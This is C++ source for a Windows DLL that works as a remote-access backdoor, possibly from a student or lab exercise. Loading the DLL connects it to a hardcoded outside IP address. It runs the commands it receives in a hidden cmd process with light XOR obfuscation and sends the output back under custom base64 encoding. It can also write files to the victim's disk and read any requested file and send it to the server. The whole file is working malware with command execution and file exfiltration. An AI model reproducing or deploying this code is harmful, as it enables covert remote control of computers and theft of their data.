#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include "pch.h"
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <windows.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <winsock2.h>
#pragma comment(lib, "Ws2_32.lib")
#include <iostream>
#include <fstream>

#define DEFAULT_BUFLEN 40000
#define PORT "1234"
#define SERVER_ADDRESS "129.21.126.227"


static const unsigned char custom_table[65] =
"uLoqK3h57MieJNUPzmdG1A9DCZBtjwlOVWaYTcx2pI/g0rb+4SfE6nFRHvyXkQs8";

char* decryptfunction(char* command) {
	for (int i = 0; i < strlen(command); i++) {
		command[i] ^= 0x89;
	}

	return command;
}

char* encoderesult(const unsigned char* result, size_t resultlen) {
	unsigned char* out, * pos;
	const unsigned char* end, * in;

	char outStr[DEFAULT_BUFLEN] = { 0 };

	out = (unsigned char*)&outStr[0];

	end = result + resultlen;
	in = result;
	pos = out;
	while (end - in >= 3) {
		*pos++ = custom_table[in[0] >> 2];
		*pos++ = custom_table[((in[0] & 0x03) << 4) | (in[1] >> 4)];
		*pos++ = custom_table[((in[1] & 0x0f) << 2) | (in[2] >> 6)];
		*pos++ = custom_table[in[2] & 0x3f];
		in += 3;
	}

	if (end - in) {
		*pos++ = custom_table[in[0] >> 2];
		if (end - in == 1) {
			*pos++ = custom_table[(in[0] & 0x03) << 4];
			*pos++ = '=';
		}
		else {
			*pos++ = custom_table[((in[0] & 0x03) << 4) |
				(in[1] >> 4)];
			*pos++ = custom_table[(in[1] & 0x0f) << 2];
		}
		*pos++ = '=';
	}
	return outStr;
}
std::string Exec(std::string cmd) {

	HANDLE read_handle;
	HANDLE write_handle;
	DWORD bytes_read;
	DWORD ret_code;
	SECURITY_ATTRIBUTES sa;
	PROCESS_INFORMATION pi;
	STARTUPINFOA si;
	std::string cmdline;
	DWORD available_bytes;

	CHAR output_buffer[4096];
	DWORD output_buffer_size = 4096;

	std::string return_str;

	read_handle = nullptr;
	write_handle = nullptr;

	ZeroMemory(&sa, sizeof(SECURITY_ATTRIBUTES));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&si, sizeof(STARTUPINFOA));

	sa.bInheritHandle = true;
	sa.lpSecurityDescriptor = nullptr;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	si.cb = sizeof(STARTUPINFOA);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;

	cmdline = "cmd /c " + cmd;

	//
	// Create the pipe where stdout will be redirected to.
	//
	if (CreatePipe(&read_handle, &write_handle, &sa, NULL) == FALSE) {
		goto Exit;
	}

	//
	// Set the process to output to our pipes.
	//
	si.hStdError = write_handle;
	si.hStdOutput = write_handle;

	//
	// Create the command prompt process itself.
	//
	if (CreateProcessA(nullptr, const_cast<CHAR*>(cmdline.c_str()), nullptr, nullptr, TRUE, 0, nullptr, nullptr, &si, &pi) == FALSE) {
		goto Exit;
	}

	//
	// Wait for the command prompt process to exit.
	// Maximum execution time of 5 seconds (to prevent hanging).
	//
	ret_code = WaitForSingleObject(pi.hProcess, 30000);
	if (ret_code == WAIT_TIMEOUT) {
		TerminateProcess(pi.hProcess, 0);
	}

	//
	// Check if there was any output.
	//
	if (PeekNamedPipe(read_handle, nullptr, 0, nullptr, &available_bytes, nullptr) == FALSE || !available_bytes) {
		sprintf_s(output_buffer, output_buffer_size, "No bytes to read.\n");
		goto Exit;
	}
	if (available_bytes > output_buffer_size)
		available_bytes = output_buffer_size - 1;

	//
	// Read in the output.
	//
	if (ReadFile(read_handle, output_buffer, available_bytes, &bytes_read, NULL) == FALSE) {
		goto Exit;
	}

	//
	// Append a null-terminator.
	//
	output_buffer[bytes_read] = '\0';
	return_str = std::string(output_buffer);

Exit:
	//
	// Clean up open handles.
	//
	if (read_handle)
		CloseHandle(read_handle);

	if (write_handle)
		CloseHandle(write_handle);
	return return_str;
}



int entry() {

	WSADATA wsaData;
	int iResult;

	//make da socket
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed: %d\n", iResult);
		return 1;
	}

	struct addrinfo* result = NULL,
		* ptr = NULL,
		hints;

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	iResult = getaddrinfo(SERVER_ADDRESS, PORT, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed: %d\n", iResult);
		WSACleanup();
		return 1;
	}

	SOCKET ConnectSocket = INVALID_SOCKET;

	ptr = result;
	ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
		ptr->ai_protocol);

	iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		closesocket(ConnectSocket);
		ConnectSocket = INVALID_SOCKET;
	}

	int recvbuflen = DEFAULT_BUFLEN;
	const char* sendbuf = "Hello Potato";
	char recvbuf[DEFAULT_BUFLEN];

	int sendresult;

	printf("Bytes Sent: %ld\n", iResult);


	do {
		iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
		if (iResult > 0)
		{
			recvbuf[iResult] = '\0';


			char* decryp = decryptfunction(recvbuf);
			printf(decryp);

			if (std::strcmp(decryp, "upload") == 0) {
				iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
				recvbuf[iResult] = '\0';
				char* decryp = decryptfunction(recvbuf);
				const char* pleasework = decryp;
				printf(decryp);
				printf("\n");
				FILE* fp;
				fp = fopen("C:\\dailyreport.txt", "w+");
				if (fp)
				{
					fputs(pleasework, fp);
					fclose(fp);
				}
			}
			else if (std::strcmp(decryp, "download") == 0) {
				iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
				recvbuf[iResult] = '\0';
				char* decryp = decryptfunction(recvbuf);
				printf(decryp);

				FILE* fp;
				long lSize;
				char* filedata;
				size_t result;

				fp = fopen(decryp, "rb");
				fseek(fp, 0, SEEK_END);
				lSize = ftell(fp);
				rewind(fp);
				filedata = (char*)malloc(lSize + 1);
				fread(filedata, lSize, 1, fp);
				fclose(fp);
				filedata[lSize] = '\0';
				unsigned char* filetest;
				filetest = (unsigned char*)filedata;
				char* encryptedmsg = encoderesult(filetest, lSize);
				sizeof(encryptedmsg);
				int err = send(ConnectSocket, filedata, lSize, 0);
				if (err <= 0)
				{
					printf("send: %d\n", WSAGetLastError());
				}

			}

			else {
				std::string report = Exec(std::string(decryp));
				//send the resulting data
				const char* cstr = report.c_str();
				printf(cstr);
				unsigned char* test;
				test = (unsigned char*)cstr;
				int leng = strlen(cstr);
				char* encryptedmsg = encoderesult(test, leng);
				//set sendbuf to the encrypt message and this should be gucci?

				sendresult = send(ConnectSocket, encryptedmsg, (int)strlen(encryptedmsg), 0);
				if (sendresult == SOCKET_ERROR) {
					printf("send failed: %d\n", WSAGetLastError());
					closesocket(ConnectSocket);
					WSACleanup();
					return 1;
				}
			}




			printf("Bytes received: %d\n", iResult);
		}
		else if (iResult == 0)
			printf("Connection closed\n");
		else
			printf("recv failed: %d\n", WSAGetLastError());
	} while (iResult > 0);


}

// dllmain.cpp : Defines the entry point for the DLL application.


BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	int retvalue;
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		retvalue = entry();
		break;
	case DLL_THREAD_ATTACH:
		retvalue = entry();
		break;
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

